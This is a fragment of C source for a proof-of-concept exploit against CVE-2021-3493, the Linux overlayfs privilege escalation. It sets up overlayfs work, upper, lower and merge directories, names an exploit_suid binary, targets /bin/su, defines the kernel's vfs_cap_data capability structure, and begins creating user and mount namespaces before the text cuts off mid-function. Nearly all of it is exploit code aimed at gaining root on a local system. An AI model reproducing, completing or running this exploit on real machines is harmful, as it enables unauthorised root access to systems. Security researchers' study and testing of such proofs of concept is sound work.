#define DIR_WORK DIR_BASE "/work"
#define DIR_UPPER DIR_BASE "/upper"
#define DIR_LOWER DIR_BASE "/lower"
#define DIR_MERGE DIR_BASE "/merge"
#define EXE_PATH DIR_UPPER "/exploit_suid"
#define SU_SHELL_PATH "/bin/su" // A binary to copy that can be used for privilege escalation

// Structure for the 'security.capability' extended attribute
// This matches the kernel's 'struct vfs_cap_data'
struct vfs_cap_data {
    unsigned int magic_etc;
    struct {
        unsigned int permitted;
        unsigned int inheritable;
    } data[2];
};

void cleanup_and_exit(const char *msg) {
    perror(msg);
    system("rm -rf " DIR_BASE);
    exit(EXIT_FAILURE);
}

int main(void) {
    printf("[*] Starting PoC for CVE-2021-3493.\n");

    // 1. Create a new user namespace
    printf("[*] Creating user and mount namespaces...\n");
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) != 0) {
        cleanup_and_exit("[-] Failed to create user namespace");
    }

    // 2. Setup overlayfs directories
    printf("[*] Creating overlayfs directories at %s...\n", DIR_BASE);
    if (system("rm -rf " DIR_BASE " && mkdir -p " DIR_WORK " " DIR_UPPER " " DIR_LOWER " " DIR_MERGE) != 0) {
        cleanup_and_exit("[-] Failed to create directories");
